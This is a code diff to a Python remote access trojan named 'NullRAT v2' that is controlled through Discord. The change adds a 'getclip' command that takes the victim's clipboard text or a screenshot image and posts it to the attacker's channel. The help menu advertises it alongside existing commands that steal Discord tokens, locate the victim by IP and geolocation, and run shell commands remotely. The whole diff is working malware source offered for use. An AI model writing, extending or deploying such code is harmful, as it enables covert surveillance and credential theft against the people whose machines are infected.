@@ -1,4 +1,5 @@
 import os, subprocess, re, discord
+from PIL import ImageGrab, Image
 from discord.ext import commands
 from requests import get
 from socket import create_connection
@@ -221,17 +222,11 @@ async def shell(ctx, msg):
         print(numb)
         if numb < 1:
             await ctx.send(
-                embed=EmbedGen(
-                    "Information",
-                    "def",
-                    "Command Output:",
-                    "Command not recognized or no output was obtained",
-                )
+                embed=EmbedGen("Information", "def", "Command Output:", "Command not recognized or no output was obtained")
             )
         elif numb > 1990:
-            f1 = open("shell.txt", "a")
-            f1.write(result)
-            f1.close()
+            with open("shell.txt", "a") as f1:
+                f1.write(result)
             file = discord.File("shell.txt", filename="shell.txt")
             await ctx.send("Command successfully executed", file=file)
             os.popen("del shell.txt")
@@ -243,14 +238,26 @@ async def shell(ctx, msg):
         )
         status = None
 
-@client.command() ## Ultra experimental # i-vone
-async def clipboard(ctx):
-    await send_subprocess(ctx, "@PowerShell Get-Clipboard")
-    
+@client.command()
+async def getclip(ctx):
+    output = subprocess.getoutput('powershell.exe Get-Clipboard -Raw')
+    if len(output) > 1998:
+        await ctx.send(embed = discord.Embed(title="Clipboard content too large\n--> Unable to send!", color=0x0081FA))
+    elif output == "":
+        os.chdir(f"C:\\Users\\{os.getenv('username')}\\Saved Games")
+        im = ImageGrab.grabclipboard()
+        if isinstance(im, Image.Image): im.save('tmp.png')
+        try: await ctx.send(file = discord.File(f"C:\\Users\\{os.getenv('username')}\\Saved Games\\tmp.png"))
+        except: await ctx.send(embed = discord.Embed(title = "Clipboard is empty", color = 0x0081FA))
+        os.remove("tmp.png")
+    else:
+        await ctx.send(output)
+        
 @client.command()
 async def menu(ctx):
     embed = discord.Embed(title="NullRAT v2 Help Menu", color=0x0081FA)
     embed.add_field(name="rat> token", value="Finds Discord Token", inline=False)
+    embed.add_field(name="rat> getclip", value="Grabs text/image from the clipboard", inline=False)
     embed.add_field(name="rat> getip", value="Get victim's public IP address", inline=False)
     embed.add_field(name="rat> geolocate", value="Finds victim's geolocation information", inline=False)
     embed.add_field(name="rat> gsl", value="Sends a general system log", inline=False)
